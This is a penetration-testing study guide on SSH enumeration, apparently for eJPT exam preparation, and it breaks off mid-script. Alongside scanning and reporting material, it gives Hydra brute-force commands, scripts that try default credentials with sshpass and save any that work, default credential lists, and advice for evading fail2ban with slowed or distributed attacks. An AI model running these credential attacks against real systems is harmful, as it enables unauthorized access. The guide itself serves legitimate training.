# 🔐 SSH Enumeration - Complete Study Guide

> **Secure Shell Service Analysis & Penetration Testing**

**Document Path:** `05-service-enumeration/ssh-enumeration.md`  

---

## 📋 Table of Contents
1. [What is SSH Enumeration?](#what-is-ssh-enumeration)
2. [SSH Protocol Fundamentals](#ssh-protocol-fundamentals)
3. [Installation and Setup](#installation-and-setup)
4. [Enumeration Techniques](#enumeration-techniques)
5. [Tools and Commands](#tools-and-commands)
6. [Practical Lab Examples](#practical-lab-examples)
7. [eJPT Exam Preparation](#ejpt-exam-preparation)
8. [Advanced Techniques](#advanced-techniques)
9. [Common Issues & Solutions](#common-issues--solutions)
10. [Documentation and Reporting](#documentation-and-reporting)

---

## 🎯 What is SSH Enumeration?

**SSH (Secure Shell) enumeration** is the systematic process of gathering information about SSH services to identify:

- **Service versions** and configurations
- **Supported authentication methods**
- **Available user accounts**
- **Encryption algorithms** and key exchange methods
- **Potential security vulnerabilities**
- **Host key fingerprints**

### Why is SSH Enumeration Important?

**For Penetration Testers:**
- Identify attack vectors and entry points
- Assess authentication mechanisms
- Find misconfigurations and weak credentials
- Evaluate SSH security posture

**For System Administrators:**
- Audit SSH configurations
- Identify security gaps
- Verify proper hardening
- Monitor service exposure

---

## 🌐 SSH Protocol Fundamentals

### SSH Protocol Structure

```
Client                           Server
  |                               |
  |-- 1. Protocol Version ------->|
  |<-- 2. Protocol Version -------|
  |                               |
  |-- 3. Key Exchange ----------->|
  |<-- 4. Key Exchange -----------|
  |                               |
  |-- 5. Authentication --------->|
  |<-- 6. Authentication Result --|
  |                               |
  |-- 7. Encrypted Communication -|
```

### Key Components to Enumerate

**1. Protocol Version**
- SSH-1.0 (deprecated, vulnerable)
- SSH-2.0 (current standard)

**2. Authentication Methods**
- Password authentication
- Public key authentication
- Keyboard-interactive
- GSSAPI authentication
- Host-based authentication

**3. Encryption Algorithms**
- Symmetric ciphers (AES, ChaCha20)
- Key exchange algorithms (DH, ECDH)
- MAC algorithms (HMAC-SHA2)

---

## 📦 Installation and Setup

### Core Tools Installation

```bash
# Ubuntu/Debian systems
sudo apt update
sudo apt install -y nmap hydra sshpass openssh-client netcat

# Verify installations
ssh -V                    # Check SSH client version
nmap --version           # Verify Nmap installation
hydra -h | head -5       # Check Hydra installation

# Install additional enumeration tools
sudo apt install -y ssh-audit enum4linux nikto
```

### Essential Nmap NSE Scripts

```bash
# List all SSH-related NSE scripts
ls /usr/share/nmap/scripts/ssh*

# Key scripts for enumeration:
# ssh-hostkey.nse      - Extract host keys
# ssh-auth-methods.nse - Enumerate auth methods
# ssh-brute.nse        - Brute force passwords
# ssh2-enum-algos.nse  - List supported algorithms
# ssh-run.nse          - Execute commands via SSH
```

### Environment Setup

```bash
# Create working directory
mkdir ~/ssh-enumeration
cd ~/ssh-enumeration

# Create common wordlists directory
mkdir wordlists
cp /usr/share/wordlists/rockyou.txt ./wordlists/
echo -e "root\nadmin\nuser\nguest\nubuntu\ndebian" > wordlists/common_users.txt
echo -e "password\n123456\nadmin\nroot\nubuntu" > wordlists/common_passwords.txt
```

---

## 🔍 Enumeration Techniques

### Phase 1: Service Discovery

**Objective:** Identify SSH services and their basic information

```bash
# 1. Port scanning for SSH services
nmap -p 22 -sV <target>                    # Standard SSH port
nmap -p 22,2222,22022 -sV <target>         # Common alternative ports
nmap -p 1-65535 -sV <target> | grep ssh   # Full port scan for SSH

# 2. Service version detection
nmap -p 22 -sV -sC <target>                # With default scripts
nmap -p 22 -A <target>                     # Aggressive scan
```

**Expected Output Analysis:**
```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
|_ssh-hostkey: 2048 aa:bb:cc:dd... (RSA)
```

### Phase 2: Banner Grabbing

**Objective:** Extract detailed service banners and version information

```bash
# Method 1: Netcat banner grabbing
nc <target> 22
timeout 3 nc <target> 22

# Method 2: Telnet banner grabbing  
telnet <target> 22

# Method 3: SSH client banner
ssh -v <target> 2>&1 | grep "remote software version"

# Method 4: Custom Python script
python3 -c "
import socket
s = socket.socket()
s.settimeout(3)
s.connect(('$TARGET', 22))
print(s.recv(1024).decode().strip())
s.close()
"
```

### Phase 3: Detailed Service Enumeration

**Objective:** Gather comprehensive SSH service information

```bash
# Host key enumeration
nmap --script ssh-hostkey -p 22 <target>

# Authentication methods discovery
nmap --script ssh-auth-methods -p 22 <target>

# Algorithm enumeration
nmap --script ssh2-enum-algos -p 22 <target>

# Combined enumeration
nmap --script "ssh-*" -p 22 <target>
```

### Phase 4: User Enumeration

**Objective:** Identify valid user accounts

```bash
# Method 1: Timing-based user enumeration
for user in $(cat wordlists/common_users.txt); do
    echo "Testing user: $user"
    time ssh -o ConnectTimeout=1 -o PasswordAuthentication=no $user@<target> 2>&1
done

# Method 2: Error message analysis
ssh invalid_user_12345@<target>        # Non-existent user
ssh root@<target>                      # Existing user (different response)

# Method 3: Using enum4linux (if Samba is also running)
enum4linux -U <target>
```

---

## 🛠️ Tools and Commands

### Essential Nmap Commands

| **Purpose** | **Command** | **Description** |
|-------------|-------------|-----------------|
| **Basic Discovery** | `nmap -p 22 -sV <target>` | Service version detection |
| **Host Key Info** | `nmap --script ssh-hostkey -p 22 <target>` | Extract SSH host keys |
| **Auth Methods** | `nmap --script ssh-auth-methods -p 22 <target>` | List authentication methods |
| **Algorithm Enum** | `nmap --script ssh2-enum-algos -p 22 <target>` | Supported algorithms |
| **Comprehensive** | `nmap --script "ssh-*" -p 22 <target>` | All SSH scripts |
| **Brute Force** | `nmap --script ssh-brute -p 22 <target>` | Password brute forcing |

### SSH Client Commands

| **Purpose** | **Command** | **Description** |
|-------------|-------------|-----------------|
| **Verbose Connection** | `ssh -v user@<target>` | Debug connection process |
| **Specify Port** | `ssh -p 2222 user@<target>` | Connect to custom port |
| **Auth Method** | `ssh -o PreferredAuthentications=password user@<target>` | Force specific auth |
| **No Host Check** | `ssh -o StrictHostKeyChecking=no user@<target>` | Skip host key verification |
| **Connection Timeout** | `ssh -o ConnectTimeout=5 user@<target>` | Set connection timeout |
| **Key Exchange** | `ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@<target>` | Legacy algorithms |

### Hydra Brute Force Commands

| **Purpose** | **Command** | **Description** |
|-------------|-------------|-----------------|
| **Single User** | `hydra -l root -P passwords.txt ssh://<target>` | Brute force one user |
| **Multiple Users** | `hydra -L users.txt -p password ssh://<target>` | Test one password |
| **Full Brute Force** | `hydra -L users.txt -P passwords.txt ssh://<target>` | Comprehensive attack |
| **Custom Port** | `hydra -L users.txt -P passwords.txt ssh://<target>:2222` | Non-standard port |
| **Threaded Attack** | `hydra -t 4 -L users.txt -P passwords.txt ssh://<target>` | Control threads |
| **Output Results** | `hydra -L users.txt -P passwords.txt ssh://<target> -o results.txt` | Save results |

---

## 🧪 Practical Lab Examples

### Lab Scenario 1: Basic SSH Service Discovery

**Target:** 192.168.1.100
**Objective:** Identify SSH service and version

```bash
# Step 1: Initial port scan
nmap -p 22 192.168.1.100
# Result: 22/tcp open  ssh

# Step 2: Service version detection  
nmap -p 22 -sV 192.168.1.100
# Result: 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)

# Step 3: Banner grabbing
nc 192.168.1.100 22
# Result: SSH-2.0-OpenSSH_7.4

# Step 4: Detailed enumeration
nmap --script ssh-hostkey,ssh-auth-methods -p 22 192.168.1.100
```

**Expected Output:**
```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99:00 (RSA)
|   256 11:22:33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff (ECDSA)
|   256 99:88:77:66:55:44:33:22:11:00:ff:ee:dd:cc:bb:aa (ED25519)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
```

### Lab Scenario 2: Authentication Testing

**Target:** 192.168.1.100
**Objective:** Test for weak credentials

```bash
# Step 1: Create credential lists
echo -e "root\nadmin\nubuntu\nuser" > users.txt
echo -e "password\n123456\nroot\nadmin" > passwords.txt

# Step 2: Manual credential testing
ssh root@192.168.1.100
# Try common passwords: root, password, 123456

# Step 3: Automated brute force with Hydra
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Step 4: Successful login verification
ssh admin@192.168.1.100
# Password: password
# Success: admin@target:~$
```

### Lab Scenario 3: Advanced Enumeration

**Target:** 192.168.1.100  
**Objective:** Comprehensive SSH analysis

```bash
# Step 1: Full service analysis
nmap --script "ssh-*" -p 22 192.168.1.100 -oN ssh_full_scan.txt

# Step 2: Algorithm enumeration
nmap --script ssh2-enum-algos -p 22 192.168.1.100

# Step 3: User enumeration via timing
#!/bin/bash
for user in root admin user guest ubuntu debian; do
    echo "Testing: $user"
    time_result=$(timeout 5 time ssh -o ConnectTimeout=2 -o PasswordAuthentication=no $user@192.168.1.100 2>&1)
    echo "$user: $time_result" >> timing_results.txt
done

# Step 4: Custom port scanning
nmap -p 22,222,2222,22022,22222 -sV 192.168.1.100
```

---

## 📝 eJPT Exam Preparation

### Critical Skills for eJPT Success

**1. Service Identification (35%)**
- Detect SSH services on standard and non-standard ports
- Identify SSH versions and protocols
- Recognize SSH service banners

**2. Authentication Testing (30%)**  
- Test common username/password combinations
- Understand different authentication methods
- Perform basic brute force attacks

**3. Information Gathering (25%)**
- Extract host key information
- Enumerate supported algorithms
- Analyze SSH configurations

**4. Vulnerability Assessment (10%)**
- Identify outdated SSH versions
- Recognize insecure configurations
- Assess authentication weaknesses

### Must-Know Commands for eJPT

```bash
# Essential commands - memorize these!
nmap -p 22 -sV <target>                    # Service detection
nc <target> 22                             # Banner grabbing
ssh user@<target>                          # Connection testing  
nmap --script ssh-hostkey -p 22 <target>   # Host key info
hydra -l user -p pass ssh://<target>       # Brute force
```

### eJPT Exam Scenarios

**Scenario 1: SSH Service Discovery**
- **Given:** Network range 192.168.1.0/24
- **Task:** Find all SSH services
- **Solution:**
  ```bash
  nmap -p 22 -sV 192.168.1.0/24
  nmap -p 22,2222,22022 192.168.1.0/24
  ```

**Scenario 2: Version Identification**  
- **Given:** Target 192.168.1.50 with SSH service
- **Task:** Identify exact SSH version
- **Solution:**
  ```bash
  nmap -p 22 -sV 192.168.1.50
  nc 192.168.1.50 22
  ```

**Scenario 3: Authentication Testing**
- **Given:** SSH service allows password authentication
- **Task:** Find valid credentials
- **Solution:**
  ```bash
  hydra -L users.txt -P passwords.txt ssh://192.168.1.50
  # Test: admin/admin, root/root, user/password
  ```

### Exam Tips and Best Practices

**⚡ Quick Wins:**
- Always check port 22 first
- Test admin/admin, root/root immediately  
- Use netcat for quick banner grabbing
- Document all findings with screenshots

**⚠️ Common Mistakes to Avoid:**
- Don't forget non-standard SSH ports (2222, 22022)
- Don't skip service version detection (-sV flag)
- Don't rely only on automated tools
- Don't forget to test common credentials manually

**🎯 Time Management:**
- SSH enumeration: 5-10 minutes per target
- Banner grabbing: 1-2 minutes
- Basic brute force: 3-5 minutes
- Documentation: 2-3 minutes

### Practice Questions

**Question 1:** What SSH version is running on 192.168.1.100?
**Answer:** `nmap -p 22 -sV 192.168.1.100`

**Question 2:** What authentication methods are supported?
**Answer:** `nmap --script ssh-auth-methods -p 22 192.168.1.100`

**Question 3:** Can you login with admin/admin?
**Answer:** `ssh admin@192.168.1.100` (password: admin)

---

## 🚀 Advanced Techniques

### SSH User Enumeration Techniques

**1. Timing-Based Enumeration**
```bash
#!/bin/bash
# Advanced timing-based user enumeration
target=$1
valid_users=()
invalid_users=()

for user in $(cat common_users.txt); do
    echo "Testing: $user"
    
    # Measure response time
    start_time=$(date +%s.%N)
    ssh -o ConnectTimeout=5 -o PasswordAuthentication=no $user@$target 2>/dev/null
    end_time=$(date +%s.%N)
    
    # Calculate response time  
    response_time=$(echo "$end_time - $start_time" | bc)
    
    if (( $(echo "$response_time > 2.0" | bc -l) )); then
        valid_users+=($user)
        echo "[+] Potential valid user: $user (${response_time}s)"
    else
        invalid_users+=($user)
        echo "[-] Invalid user: $user (${response_time}s)"
    fi
    
    sleep 1
done

echo "Valid users found: ${valid_users[@]}"
```

**2. SSH-ENUM Script**
```bash
#!/bin/bash
# Custom SSH enumeration script
target=$1
output_dir="ssh-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p $output_dir

echo "=== SSH Enumeration Started for $target ===" | tee $output_dir/summary.txt

# Service discovery
echo "[+] Discovering SSH services..." | tee -a $output_dir/summary.txt
nmap -p 22,222,2222,22022 -sV $target > $output_dir/service_discovery.txt

# Extract SSH port
ssh_port=$(grep -E "(22|222|2222|22022).*ssh" $output_dir/service_discovery.txt | head -1 | awk '{print $1}' | cut -d'/' -f1)

if [ -n "$ssh_port" ]; then
    echo "[+] SSH found on port $ssh_port" | tee -a $output_dir/summary.txt
    
    # Banner grabbing
    echo "[+] Grabbing banner..." | tee -a $output_dir/summary.txt
    timeout 3 nc $target $ssh_port > $output_dir/banner.txt 2>&1
    
    # Host keys
    echo "[+] Extracting host keys..." | tee -a $output_dir/summary.txt
    nmap --script ssh-hostkey -p $ssh_port $target > $output_dir/hostkeys.txt
    
    # Authentication methods
    echo "[+] Checking auth methods..." | tee -a $output_dir/summary.txt  
    nmap --script ssh-auth-methods -p $ssh_port $target > $output_dir/auth_methods.txt
    
    # Algorithm enumeration
    echo "[+] Enumerating algorithms..." | tee -a $output_dir/summary.txt
    nmap --script ssh2-enum-algos -p $ssh_port $target > $output_dir/algorithms.txt
    
    # User enumeration
    echo "[+] Testing common users..." | tee -a $output_dir/summary.txt
    for user in root admin administrator user guest ubuntu debian oracle; do
        echo "Testing: $user" >> $output_dir/user_enum.txt
        timeout 3 ssh -o ConnectTimeout=2 -o PasswordAuthentication=no $user@$target 2>&1 | grep -E "(Permission denied|Authentication failed|Invalid user)" >> $output_dir/user_enum.txt
    done
    
    # Common credential testing
    echo "[+] Testing weak credentials..." | tee -a $output_dir/summary.txt
    echo "Common credential tests:" > $output_dir/credential_tests.txt
    
    for user in root admin user; do
        for pass in $user password 123456 admin root; do
            echo "Trying $user:$pass" >> $output_dir/credential_tests.txt
            timeout 10 sshpass -p $pass ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $user@$target "whoami" &>> $output_dir/credential_tests.txt
            if [ $? -eq 0 ]; then
                echo "[!] SUCCESS: $user:$pass" | tee -a $output_dir/summary.txt
                echo "$user:$pass" >> $output_dir/valid_credentials.txt
            fi
        done
    done
    
    echo "[+] Enumeration complete! Results in $output_dir/" | tee -a $output_dir/summary.txt
else
    echo "[-] No SSH service found" | tee -a $output_dir/summary.txt
fi
```

### SSH Tunneling and Port Forwarding

**Local Port Forwarding:**
```bash
# Forward local port 8080 to target's port 80 via SSH
ssh -L 8080:localhost:80 user@ssh-server

# Access via: http://localhost:8080
```

**Remote Port Forwarding:**
```bash
# Forward target's port 8080 to local port 80
ssh -R 8080:localhost:80 user@ssh-server
```

**Dynamic SOCKS Proxy:**
```bash
# Create SOCKS proxy on local port 8080
ssh -D 8080 user@ssh-server

# Configure browser to use localhost:8080 as SOCKS proxy
```

---

## ⚠️ Common Issues & Solutions

### Issue 1: Connection Timeouts

**Problem:** SSH connections timing out
**Symptoms:**
- `Connection timed out`
- `No route to host`

**Solutions:**
```bash
# Check network connectivity
ping <target>

# Test different ports
nmap -p 22,222,2222,22022 <target>

# Increase timeout values
ssh -o ConnectTimeout=30 user@<target>
```

### Issue 2: Key Exchange Failures

**Problem:** SSH key exchange failing with older systems
**Symptoms:**
- `Unable to negotiate with target`
- `no matching key exchange method found`

**Solutions:**
```bash
# Enable legacy algorithms
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@<target>

# Use older cipher suites
ssh -o Ciphers=+aes128-cbc user@<target>

# Combine multiple legacy options
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o Ciphers=+aes128-cbc -o MACs=+hmac-sha1 user@<target>
```

### Issue 3: Authentication Failures

**Problem:** Unable to authenticate despite correct credentials
**Symptoms:**
- `Permission denied (publickey)`
- `Authentication failed`

**Solutions:**
```bash
# Force password authentication
ssh -o PreferredAuthentications=password user@<target>

# Disable public key auth
ssh -o PubkeyAuthentication=no user@<target>

# Enable keyboard interactive
ssh -o PreferredAuthentications=keyboard-interactive user@<target>

# Debug authentication process
ssh -vvv user@<target>
```

### Issue 4: Host Key Verification

**Problem:** Host key verification failures
**Symptoms:**
- `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED`
- `Host key verification failed`

**Solutions:**
```bash
# Remove old host key
ssh-keygen -R <target>

# Ignore host key checking (testing only)
ssh -o StrictHostKeyChecking=no user@<target>

# Accept new host keys automatically
ssh -o StrictHostKeyChecking=accept-new user@<target>
```

### Issue 5: Brute Force Detection

**Problem:** Getting blocked by fail2ban or similar
**Symptoms:**
- Connection attempts failing after several tries
- IP address being blocked

**Solutions:**
```bash
# Slow down attacks
hydra -t 1 -W 30 -L users.txt -P passwords.txt ssh://<target>

# Use different source IPs (if available)
# Implement delays between attempts
for pass in $(cat passwords.txt); do
    ssh user@<target> 
    sleep 60  # Wait 1 minute between attempts
done

# Use distributed attack from multiple IPs
```

---

## 📊 Documentation and Reporting

### Professional Report Template

```markdown
# SSH Enumeration Report

## Executive Summary
During the security assessment of the target environment, SSH services were identified and analyzed for potential security vulnerabilities. This report details the findings and recommendations.

## Scope and Methodology
- **Target Range:** 192.168.1.0/24
- **Assessment Date:** 2024-11-26
- **Tools Used:** Nmap, Hydra, Custom Scripts
- **Methodology:** OWASP Testing Guide v4.0

## Findings Summary

### SSH Services Discovered
| Target | Port | Version | Status |
|--------|------|---------|--------|
| 192.168.1.50 | 22 | OpenSSH 7.4 | Vulnerable |
| 192.168.1.51 | 2222 | OpenSSH 8.0 | Secure |
| 192.168.1.52 | 22 | OpenSSH 6.6 | Critical |

### Critical Vulnerabilities

#### 1. Weak SSH Credentials
**Risk Level:** HIGH
**Affected Systems:** 192.168.1.50
**Description:** Default credentials found
**Evidence:**
```bash
$ ssh admin@192.168.1.50
admin@192.168.1.50's password: admin
Last login: Tue Nov 26 10:15:23 2024
admin@target:~$ 
```

**Impact:** Complete system compromise
**Recommendation:** Implement strong password policy

#### 2. Outdated SSH Version  
**Risk Level:** MEDIUM
**Affected Systems:** 192.168.1.52
**Description:** OpenSSH 6.6 contains known vulnerabilities
**Evidence:**
```bash
$ nmap -p 22 -sV 192.168.1.52
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
```

**Impact:** Potential remote code execution
**Recommendation:** Update to latest OpenSSH version

### Recommendations

#### Immediate Actions (Priority 1)
1. Change all default SSH passwords
2. Update outdated SSH versions
3. Disable password authentication where possible
4. Implement fail2ban for brute force protection

#### Short-term Actions (Priority 2)  
1. Enable SSH key-based authentication
2. Change default SSH ports
3. Implement network-level access controls
4. Configure SSH logging and monitoring

#### Long-term Actions (Priority 3)
1. Implement SSH certificate authority
2. Deploy SSH bastion hosts
3. Regular SSH security audits
4. Staff SSH security training

## Technical Details

### Enumeration Commands Used
```bash
# Service discovery
nmap -p 22,2222,22022 -sV 192.168.1.0/24

# Banner grabbing
nc 192.168.1.50 22

# Host key enumeration
nmap --script ssh-hostkey -p 22 192.168.1.50

# Authentication testing
hydra -L users.txt -P passwords.txt ssh://192.168.1.50
```

### Evidence Files
- service_discovery.txt
- banner_info.txt  
- hostkey_results.txt
- brute_force_results.txt
- screenshots/

## Conclusion
The SSH enumeration revealed multiple security issues requiring immediate attention. Implementation of the recommended security controls will significantly improve the SSH security posture.
```

### Automated Reporting Script

```bash
#!/bin/bash
# SSH Enumeration Report Generator

TARGET_RANGE=$1
REPORT_DATE=$(date "+%Y-%m-%d")
REPORT_DIR="ssh-report-$REPORT_DATE"
mkdir -p $REPORT_DIR

echo "Generating SSH enumeration report for $TARGET_RANGE..."

# HTML Report Header
cat > $REPORT_DIR/report.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>SSH Enumeration Report - $REPORT_DATE</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .critical { color: red; font-weight: bold; }
        .high { color: orange; font-weight: bold; }
        .medium { color: yellow; font-weight: bold; }
        .low { color: green; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        pre { background-color: #f4f4f4; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>SSH Enumeration Report</h1>
    <p><strong>Date:</strong> $REPORT_DATE</p>
    <p><strong>Target Range:</strong> $TARGET_RANGE</p>
    
    <h2>Executive Summary</h2>
    <p>This report contains findings from SSH service enumeration.</p>
    
    <h2>SSH Services Discovered</h2>
    <table>
        <tr>
            <th>Target</th>
            <th>Port</th>
            <th>Version</th>
            <th>Auth Methods</th>
            <th>Risk Level</th>
        </tr>
EOF

# Discover SSH services
nmap -p 22,222,2222,22022 -sV $TARGET_RANGE -oG $REPORT_DIR/discovery.txt

# Process results and add to HTML report  
grep -E "22.*ssh" $REPORT_DIR/discovery.txt | while read line; do
    target=$(echo $line | awk '{print $2}')
    port=$(echo $line | grep -oE "22[0-9]*")
    version=$(echo $line | grep -oE "OpenSSH [0-9.]+" | head -1)
    
    # Get authentication methods
    nmap --script ssh-auth-methods -p $port $target -oN $REPORT_DIR/auth_$target.txt
    auth_methods=$(grep -A5 "ssh-auth-methods" $REPORT_DIR/auth_$target.txt | grep -oE "(password|publickey|keyboard-interactive)" | tr '\n' ',' | sed 's/,$//')
    
    # Determine risk level based on version
    if [[ $version == *"6."* ]]; then
        risk="<span class='critical'>CRITICAL</span>"
    elif [[ $version == *"7."* ]]; then
        risk="<span class='high'>HIGH</span>"
    else
        risk="<span class='medium'>MEDIUM</span>"
    fi
    
    echo "        <tr><td>$target</td><td>$port</td><td>$version</td><td>$auth_methods</td><td>$risk</td></tr>" >> $REPORT_DIR/report.html
done

# Close HTML report
cat >> $REPORT_DIR/report.html << EOF
    </table>
    
    <h2>Detailed Findings</h2>
    <p>See individual result files for complete technical details.</p>
    
    <h2>Recommendations</h2>
    <ul>
        <li>Update outdated SSH versions immediately</li>
        <li>Disable password authentication where possible</li>
        <li>Implement strong password policies</li>
        <li>Enable SSH logging and monitoring</li>
    </ul>
    
</body>
</html>
EOF

echo "Report generated: $REPORT_DIR/report.html"
```

---

## 📚 Additional Resources

### Essential Learning Materials

**Official Documentation:**
- [OpenSSH Manual Pages](https://man.openbsd.org/ssh)
- [SSH Protocol RFC 4251](https://tools.ietf.org/html/rfc4251)
- [OpenSSH Configuration Guide](https://www.openssh.com/manual.html)
- [SSH Security Best Practices](https://stribika.github.io/2015/01/04/secure-secure-shell.html)

**Security Research:**
- [SSH Audit Tool](https://github.com/jtesta/ssh-audit)
- [SSH Security Hardening Guide](https://linux-audit.com/audit-and-harden-your-ssh-configuration/)
- [NIST SSH Guidelines](https://nvlpubs.nist.gov/nistpubs/ir/2015/NIST.IR.7966.pdf)

**Penetration Testing Resources:**
- [HackTricks SSH Enumeration](https://book.hacktricks.xyz/pentesting/pentesting-ssh)
- [PayloadsAllTheThings SSH](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Network%20Discovery/Network%20Enumeration%20-%20SSH)
- [OWASP Testing Guide - SSH](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Test_Network_Infrastructure_Configuration)

**Training Platforms:**
- [TryHackMe SSH Rooms](https://tryhackme.com/room/ssh)
- [Hack The Box SSH Challenges](https://app.hackthebox.com/)
- [VulnHub SSH Vulnerable VMs](https://www.vulnhub.com/)

### Quick Reference Cards

**SSH Enumeration Cheat Sheet:**
```bash
# === DISCOVERY ===
nmap -p 22 -sV <target>                    # Basic discovery
nmap -p 22,2222,22022 -sV <target>         # Common ports
nmap --top-ports 100 <target> | grep ssh   # Top ports scan

# === BANNER GRABBING ===
nc <target> 22                             # Netcat method
telnet <target> 22                         # Telnet method
ssh -v <target> 2>&1 | grep "remote"       # SSH client method

# === ENUMERATION ===
nmap --script ssh-hostkey -p 22 <target>           # Host keys
nmap --script ssh-auth-methods -p 22 <target>      # Auth methods
nmap --script ssh2-enum-algos -p 22 <target>       # Algorithms
nmap --script "ssh-*" -p 22 <target>               # All scripts

# === AUTHENTICATION ===
ssh user@<target>                          # Manual test
hydra -l user -p pass ssh://<target>       # Single credential
hydra -L users.txt -P passes.txt ssh://<target>    # Brute force

# === TROUBLESHOOTING ===
ssh -vvv user@<target>                     # Debug mode
ssh -o ConnectTimeout=10 user@<target>     # Timeout control
ssh -o StrictHostKeyChecking=no user@<target>      # Skip host check
```

**Common SSH Ports:**
```
22    - Standard SSH port
222   - Alternative SSH port  
2222  - Common alternative
22022 - Another common alternative
22222 - Sometimes used
2022  - Occasionally seen
```

**Default Credentials to Test:**
```
root:root          admin:admin        user:user
root:password      admin:password     user:password  
root:123456        admin:123456       user:123456
root:toor          admin:admin123     guest:guest
root:(blank)       admin:(blank)      ubuntu:ubuntu
```

### Advanced Scripts and Tools

**Custom SSH Scanner Script:**
```bash
#!/bin/bash
# Advanced SSH Scanner with Multiple Techniques

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

usage() {
    echo "Usage: $0 <target|target_file> [options]"
    echo "Options:"
    echo "  -p    Specify ports (default: 22,2222,22022)"
    echo "  -u    User list file"
    echo "  -P    Password list file"
    echo "  -o    Output directory"
    echo "  -t    Threads (default: 4)"
    echo "  -v    Verbose mode"
    exit 1
}

# Default values
PORTS="22,2222,22022"
USER_LIST=""
PASS_LIST=""
OUTPUT_DIR="ssh-scan-$(date +%Y%m%d-%H%M%S)"
THREADS=4
VERBOSE=false

# Parse command line arguments
while getopts "p:u:P:o:t:vh" opt; do
    case $opt in
        p) PORTS="$OPTARG" ;;
        u) USER_LIST="$OPTARG" ;;
        P) PASS_LIST="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        v) VERBOSE=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

shift $((OPTIND-1))
TARGET="$1"

if [ -z "$TARGET" ]; then
    usage
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
LOG_FILE="$OUTPUT_DIR/scan.log"

log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Function to scan single target
scan_target() {
    local target="$1"
    local target_dir="$OUTPUT_DIR/$target"
    mkdir -p "$target_dir"
    
    log "${BLUE}[INFO]${NC} Starting SSH scan for $target"
    
    # Service discovery
    log "${YELLOW}[SCAN]${NC} Discovering SSH services..."
    nmap -p "$PORTS" -sV "$target" -oN "$target_dir/service_discovery.txt" -oX "$target_dir/service_discovery.xml" 2>/dev/null
    
    # Extract SSH services
    ssh_services=$(grep -E "(22|222|2222|22022).*ssh" "$target_dir/service_discovery.txt" | awk '{print $1}' | cut -d'/' -f1)
    
    if [ -z "$ssh_services" ]; then
        log "${RED}[FAIL]${NC} No SSH services found on $target"
        return
    fi
    
    # Process each SSH service found
    for port in $ssh_services; do
        log "${YELLOW}[SCAN]${NC} Analyzing SSH on port $port..."
        
        # Banner grabbing
        timeout 3 nc "$target" "$port" > "$target_dir/banner_$port.txt" 2>/dev/null
        
        # Host key enumeration
        nmap --script ssh-hostkey -p "$port" "$target" -oN "$target_dir/hostkeys_$port.txt" 2>/dev/null
        
        # Authentication methods
        nmap --script ssh-auth-methods -p "$port" "$target" -oN "$target_dir/auth_methods_$port.txt" 2>/dev/null
        
        # Algorithm enumeration
        nmap --script ssh2-enum-algos -p "$port" "$target" -oN "$target_dir/algorithms_$port.txt" 2>/dev/null
        
        # User enumeration if verbose mode
        if [ "$VERBOSE" = true ]; then
            log "${YELLOW}[SCAN]${NC} User enumeration on port $port..."
            for user in root admin administrator user guest ubuntu debian oracle mysql postgres; do
                timeout 3 ssh -o ConnectTimeout=2 -o PasswordAuthentication=no "$user@$target" -p "$port" 2>&1 | \
                    grep -E "(Invalid user|Permission denied)" >> "$target_dir/user_enum_$port.txt"
            done
        fi
        
        # Brute force if credentials provided
        if [ -n "$USER_LIST" ] && [ -n "$PASS_LIST" ]; then
            log "${YELLOW}[ATTACK]${NC} Brute forcing SSH on port $port..."
            hydra -L "$USER_LIST" -P "$PASS_LIST" -t "$THREADS" -o "$target_dir/bruteforce_$port.txt" "ssh://$target:$port" 2>/dev/null
            
            # Check for successful logins
            if grep -q "login:" "$target_dir/bruteforce_$port.txt"; then
                log "${GREEN}[SUCCESS]${NC} Valid credentials found on $target:$port"
                grep "login:" "$target_dir/bruteforce_$port.txt" >> "$target_dir/valid_credentials.txt"
            fi
        fi
        
        # Quick common credential test
        log "${YELLOW}[TEST]${NC} Testing common credentials on port $port..."
        for cred in "root:root" "admin:admin" "user:user" "root:password" "admin:password"; do
            username=$(echo "$cred" | cut -d':' -f1)
            password=$(echo "$cred" | cut -d':' -f2)
            
            timeout 10 sshpass -p "$password" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
                "$username@$target" -p "$port" "whoami" &>/dev/null
            
            if [ $? -eq 0 ]; then
                log "${GREEN}[SUCCESS]${NC} Valid credential: $username:$password on $target:$port"
                echo "$username:$password" >> "$target_dir/valid_credentials.txt"
            fi
        done
    done
    
    log "${BLUE}[INFO]${NC} Completed SSH scan for $target"
}

# Main execution
log "${BLUE}[START]${NC} SSH enumeration started"
log "${BLUE}[INFO]${NC} Target: $TARGET"
log "${BLUE}[INFO]${NC} Ports: $PORTS"
log "${BLUE}[INFO]${NC} Output: $OUTPUT_DIR"

if [ -f "$TARGET" ]; then
    # Target is a file with multiple targets
    log "${BLUE}[INFO]${NC} Processing target file..."
